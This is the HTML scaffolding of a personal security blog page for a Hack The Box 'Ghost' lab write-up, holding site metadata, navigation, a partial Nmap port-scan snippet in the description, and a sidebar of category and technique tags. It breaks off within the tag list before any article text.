<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>【season-5】box Ghost wp | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="Nmap123456789101112131415161718192021222324252627282930313233343536PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http          Microsoft HTTPAPI htt">
<meta property="og:type" content="article">
<meta property="og:title" content="【season-5】box Ghost wp">
<meta property="og:url" content="http://example.com/2024/07/20/box-Ghost-wp/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="Nmap123456789101112131415161718192021222324252627282930313233343536PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http          Microsoft HTTPAPI htt">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/Ghost/background.png">
<meta property="article:published_time" content="2024-07-20T08:59:40.000Z">
<meta property="article:modified_time" content="2024-08-23T08:40:08.407Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/Ghost/background.png">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">13</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">10</div>
            </a>
        <div class="children"><div class="category-box">
            <a class="category-link" href="/categories/ctf/wiz/">
                wiz
                <div class="category-count">2</div>
            </a>
        </div></div>
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-8/">
                htb-Season-8
                <div class="category-count">4</div>
            </a>
        </div>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ADCS/" rel="tag">ADCS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Below/" rel="tag">Below</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CI-CD/" rel="tag">CI&#x2F;CD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2022-29623/" rel="tag">CVE-2022-29623</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CreateChild/" rel="tag">CreateChild</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Dacl/" rel="tag">Dacl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKI-ADMIN/" rel="tag">PKI ADMIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyside2/" rel="tag">Pyside2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube/" rel="tag">Roundcube</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Self/" rel="tag">Self</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TeamCity/" rel="tag">TeamCity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Teamcity/" rel="tag">Teamcity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tombstone/" rel="tag">Tombstone</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/apache/" rel="tag">apache</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure/" rel="tag">azure</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc15/" rel="tag">esc15</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mysqljs/" rel="tag">mysqljs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/owa/" rel="tag">owa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pdf/" rel="tag">pdf</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pinns/" rel="tag">pinns</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgres/" rel="tag">postgres</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" 